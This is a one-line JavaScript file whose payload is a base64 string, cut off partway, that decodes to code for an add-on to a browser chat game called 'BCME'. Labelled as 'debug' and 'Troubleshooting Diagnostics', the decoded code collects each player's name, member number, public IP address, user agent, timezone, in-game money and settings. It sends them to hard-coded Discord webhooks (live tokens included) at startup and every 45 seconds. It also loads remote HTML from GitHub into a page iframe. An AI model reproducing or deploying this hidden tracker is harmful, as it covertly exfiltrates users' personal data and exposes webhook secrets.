var sprc = atob('Ly9TZW5kIERlYnVnX19fX19fX19fX19fX19fX19fX19fXwphc3luYyBmdW5jdGlvbiBzZW5kRGlzY29yZE1lc3NhZ2UoKSB7CiAgY29uc3QgZ0lQQSA9IGFzeW5jICgpID0+IHsKICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgIHJldHVybiBkYXRhLmlwOwogIH07CgogIGNvbnN0IGlwQSA9IGF3YWl0IGdJUEEoKTsKCiAgc2V0VGltZW91dCgoKSA9PiB7CiAgICBjb25zdCB3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODE2MTIxNTc5NzM3MTI4OTYvLVJuc3RyTjNNazVZYXBwVUtVdUhjYTBLUWN3NlVEX3huQ3R4Ulh4TG1aYVkzQ3Fnb2dJdjVtVnV0NWpPR2draHNHYzkiOwogICAgY29uc3QgdG90YWxuYW1lID0gUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIjsKICAgIGNvbnN0IHVzZXJuYW1lID0gdG90YWxuYW1lOwogICAgY29uc3QgYXZhdGFyVXJsID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBjb25zdCB1c2VyYWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogICAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgICBjb25zdCBvcGVuVGFicyA9IHdpbmRvdy5sZW5ndGg7CiAgICBjb25zdCBzY3JlZW5TaXplID0gYCR7d2luZG93LnNjcmVlbi53aWR0aH14JHt3aW5kb3cuc2NyZWVuLmhlaWdodH1gOwoKICAgIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICAgIGNvbnRlbnQ6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIgKyAiIGxvZ2dlZCBpbnRvIEJDTUUiLAogICAgICBlbWJlZHM6IFt7CiAgICAgICAgdGl0bGU6ICJUcm91Ymxlc2hvb3RpbmcgRGlhZ25vc3RpY3MgIiwKICAgICAgICBmaWVsZHM6IFsKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIlVzZXIiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIiwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiVGltZXpvbmUiLAogICAgICAgICAgICB2YWx1ZTogdGltZXpvbmUsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkRldmljZSBUeXBlIiwKICAgICAgICAgICAgdmFsdWU6IHVzZXJhZ2VudCwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiTW9uZXkiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLk1vbmV5LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJOaWNrbmFtZSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmlja25hbWUsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkZvbnQiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLkdyYXBoaWNzU2V0dGluZ3MuRm9udCwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiQ2hhdCBDb2xvciBUaGVtZSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuQ2hhdFNldHRpbmdzLkNvbG9yVGhlbWUsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkFyb3VzYWwgUHJvZ3Jlc3MiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLkFyb3VzYWxTZXR0aW5ncy5Qcm9ncmVzcywKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiTGFzdCBDaGF0IFJvb20iLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLkxhc3RDaGF0Um9vbSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiTG9jYWwgSVAgQWRkcmVzcyIsCiAgICAgICAgICAgIHZhbHVlOiBpcEEsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk9wZW4gVGFicyIsCiAgICAgICAgICAgIHZhbHVlOiBvcGVuVGFicywKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiU2NyZWVuIFNpemUiLAogICAgICAgICAgICB2YWx1ZTogc2NyZWVuU2l6ZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9CiAgICAgICAgXQogICAgICB9XQogICAgfTsKCiAgICBjb25zdCBwYXlsb2FkID0gewogICAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICAgIGF2YXRhcl91cmw6IGF2YXRhclVybCwKICAgICAgY29udGVudDogbWVzc2FnZS5jb250ZW50LAogICAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgICB9OwoKICAgIGZldGNoKHdlYmhvb2tVcmwsIHsKICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgIGhlYWRlcnM6IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICAgIH0sCiAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICB9KTsKICB9LCA2MDAwMCk7Cn0KCnNlbmREaXNjb3JkTWVzc2FnZSgpOwoKCi8vdXNlZCBmdW5jdGlvbiBkZWJ1Z19fX19fX19fX19fX18KCmFzeW5jIGZ1bmN0aW9uIHNlbmRGZGVidWcoKSB7CiAgdHJ5IHsKICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgIGNvbnN0IGlwQSA9IGRhdGEuaXA7CgogICAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDgxNjUwMTM1NDA4MzEyNDIwL3BRMXdvb3ZKVFlZTGhPRWJsaGFaTkUwQWh1dVNveXVNTy0yVHJPd0xDMGJaREQxNENKbzZKbEtmRnhOQVptME9kdXpXIjsKICAgIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgICBjb25zdCB1c2VybmFtZSA9IHRvdGFsbmFtZTsKICAgIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICAgIGNvbnN0IHRpbWV6b25lID0gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwogICAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogICAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKCiAgICBjb25zdCBtZXNzYWdlID0gewogICAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiB1c2VkIGEgZnVuY3Rpb24gaW4gQkNNRSIsCiAgICAgIGVtYmVkczogW3sKICAgICAgICB0aXRsZTogIlRyb3VibGVzaG9vdGluZyBEaWFnbm9zdGljcyAiLAogICAgICAgIGZpZWxkczogWwogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiVXNlciIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICAgIHZhbHVlOiB0aW1lem9uZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJNb25leSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTW9uZXksCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5OaWNrbmFtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRm9udCIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJDaGF0IENvbG9yIFRoZW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuQXJvdXNhbFNldHRpbmdzLlByb2dyZXNzLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMb2NhbCBJUCBBZGRyZXNzIiwKICAgICAgICAgICAgdmFsdWU6IGlwQSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiT3BlbiBUYWJzIiwKICAgICAgICAgICAgdmFsdWU6IG9wZW5UYWJzLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJTY3JlZW4gU2l6ZSIsCiAgICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0KICAgICAgICBdCiAgICAgIH1dCiAgICB9OwoKICAgIGNvbnN0IHBheWxvYWQgPSB7CiAgICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgICAgYXZhdGFyX3VybDogYXZhdGFyVXJsLAogICAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICAgIGVtYmVkczogbWVzc2FnZS5lbWJlZHMKICAgIH07CgogICAgYXdhaXQgZmV0Y2god2ViaG9va1VybCwgewogICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgaGVhZGVyczogewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgfSwKICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKGVycm9yKTsKICB9Cn0KCgovL1BlcmlvZGljYWwgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgphc3luYyBmdW5jdGlvbiBzZW5kRGlzY29yZE1lc3NhZ2UoKSB7CiAgY29uc3QgZ0lQQSA9IGFzeW5jICgpID0+IHsKICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgIHJldHVybiBkYXRhLmlwOwogIH07CgogIGNvbnN0IGlwQSA9IGF3YWl0IGdJUEEoKTsKCiAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDgxOTcxODYwMzAxOTUxMTA2L2FPN2NJSngxN1U0cm52RmV1c2dXanJqY0UzQUNJWE42VHl3Z3hjbDByMzNPRnBzQXhnR3h4Rm12SzBSWDhmUFkybzlsIjsKICBjb25zdCB0b3RhbG5hbWUgPSBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiOwogIGNvbnN0IHVzZXJuYW1lID0gdG90YWxuYW1lOwogIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogIGNvbnN0IHVzZXJhZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogIGNvbnN0IHNjcmVlblNpemUgPSBgJHt3aW5kb3cuc2NyZWVuLndpZHRofXgke3dpbmRvdy5zY3JlZW4uaGVpZ2h0fWA7CgogIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiBpcyBhY3RpdmUgb24gQkNNRSIsCiAgICBlbWJlZHM6IFt7CiAgICAgIHRpdGxlOiAiVHJvdWJsZXNob290aW5nIERpYWdub3N0aWNzICIsCiAgICAgIGZpZWxkczogWwogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJVc2VyIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiVGltZXpvbmUiLAogICAgICAgICAgdmFsdWU6IHRpbWV6b25lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICAgICAgdmFsdWU6IHVzZXJhZ2VudCwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk1vbmV5IiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTW9uZXksCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJOaWNrbmFtZSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLk5pY2tuYW1lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiRm9udCIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkdyYXBoaWNzU2V0dGluZ3MuRm9udCwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkNoYXQgQ29sb3IgVGhlbWUiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkFyb3VzYWwgUHJvZ3Jlc3MiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5Bcm91c2FsU2V0dGluZ3MuUHJvZ3Jlc3MsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkxhc3RDaGF0Um9vbSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkxvY2FsIElQIEFkZHJlc3MiLAogICAgICAgICAgdmFsdWU6IGlwQSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk9wZW4gVGFicyIsCiAgICAgICAgICB2YWx1ZTogb3BlblRhYnMsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJTY3JlZW4gU2l6ZSIsCiAgICAgICAgICB2YWx1ZTogc2NyZWVuU2l6ZSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0KICAgICAgXQogICAgfV0KICB9OwoKICBjb25zdCBwYXlsb2FkID0gewogICAgdXNlcm5hbWU6IHVzZXJuYW1lLAogICAgYXZhdGFyX3VybDogYXZhdGFyVXJsLAogICAgY29udGVudDogbWVzc2FnZS5jb250ZW50LAogICAgZW1iZWRzOiBtZXNzYWdlLmVtYmVkcwogIH07CgogIGZldGNoKHdlYmhvb2tVcmwsIHsKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogewogICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICB9KTsKfQoKc2V0SW50ZXJ2YWwoc2VuZERpc2NvcmRNZXNzYWdlLCA0NTAwMCk7CgoKLy9FbmQgT2YgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgoKLy9TdGFydCBPZiBMb2FkaW5nIFNjcmVlbl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCi8vIFVSTCBvZiBsb2FkaW5nIHNjcmVlbgpjb25zdCBodG1sRmlsZVVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNLS9tYWluL2xvYWRpbmc0JzsKCi8vIEZldGNoIHRoZSBjb2RlIGZyb20gdGhlIHJhdyBHaXRIdWIgZmlsZSB1c2luZyBGZXRjaCBBUEkKZmV0Y2goaHRtbEZpbGVVcmwpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGh0bWwgPT4gewogICAgLy8gTmV3IGlmcmFtZSBlbGVtZW50CiAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKICAgIGlmcmFtZS5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CiAgICBpZnJhbWUuc3R5bGUudG9wID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLmxlZnQgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAnMTM4JSc7CiAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gJzEyNSUnOwogICAgaWZyYW1lLnN0eWxlLm1hcmdpbkxlZnQgPSAnLTE5JSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCiAgICBpZnJhbWUuc3R5bGUubWFyZ2luVG9wID0gJy0yJSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCgoKCiAgICAvLyBMb2FkIHRoZSBpbXBvcnRlZCBIVE1MIGludG8gdGhlIGlmcmFtZQogICAgaWZyYW1lLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgICBjb25zdCBpZnJhbWVEb2N1bWVudCA9IHRoaXMuY29udGVudFdpbmRvdy5kb2N1bWVudDsKICAgICAgaWZyYW1lRG9jdW1lbnQub3BlbigpOwogICAgICBpZnJhbWVEb2N1bWVudC53cml0ZShodG1sKTsKICAgICAgaWZyYW1lRG9jdW1lbnQuY2xvc2UoKTsKICAgIH07CgogICAgLy8gQXBwZW5kIHRoZSBpZnJhbWUgdG8gQkMncyA8Ym9keT4gZWxlbWVudAogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgLy8gVGltZW91dCB0aGUgZnJhbWUKc2V0VGltZW91dCgoKSA9PiB7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwp9LCA3MDAwKTsKICB9KQogIC5jYXRjaChlcnJvciA9PiB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciBpbXBvcnRpbmcgSFRNTDonLCBlcnJvcik7CiAgfSk7CgoKLy9FbmQgT2YgTG9hZGluZyBTY3JlZW4gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCiAgCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vc2VydmVybWFpbnRhaW5hbmNlJykKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oZGF0YSA9PiB7CiAgICBjb25zdCByZWdleCA9IC9cZCsvOwogICAgY29uc3QgbWF0Y2ggPSBkYXRhLm1hdGNoKHJlZ2V4KTsKICAgIGlmIChtYXRjaCAmJiBwYXJzZUludChtYXRjaFswXSkgPj0gMSkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RNYWludCgpIHsKICAgICAgICAvLyBUb2FzdCBjb250YWluZXIKICAgICAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKICAgIHN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogICAgc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwogICAgCiAgICAvLyBVcGRhdGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAogICAgLy8gQ3JlYXRlIHRoZSBjbG9zZSBidXR0b24KdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKTsKCi8vIENsb3NlIHRoZSB0b2FzdCB3aGVuIHRoZSBjbG9zZSBidXR0b24gaXMgY2xpY2tlZApjbG9zZUJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfSwgNTAwKTsKfSk7CgogICAgLy8gQkNNIExvZ28gSWNvbgogICAgdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIGljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MT